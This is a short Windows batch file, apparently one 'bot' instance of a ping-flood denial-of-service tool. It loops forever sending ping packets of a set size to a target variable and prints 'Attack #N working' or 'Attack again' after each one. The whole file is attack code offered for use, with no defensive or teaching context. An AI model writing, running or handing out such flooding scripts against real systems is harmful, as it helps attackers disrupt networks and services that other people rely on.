@echo off
mode 26,5
set attack=0
title Bot #%botnumber%
cls
color 0a
:start
set /a attack=%attack%+1
ping %attacktarget% -l %datapaks% -w 5 -n 1 >nul
if errorlevel 1 goto error
color 0a
echo Attack #%attack% working.
goto start
:error
color 0c
echo Attack #%attack% failed, Attack again.
goto start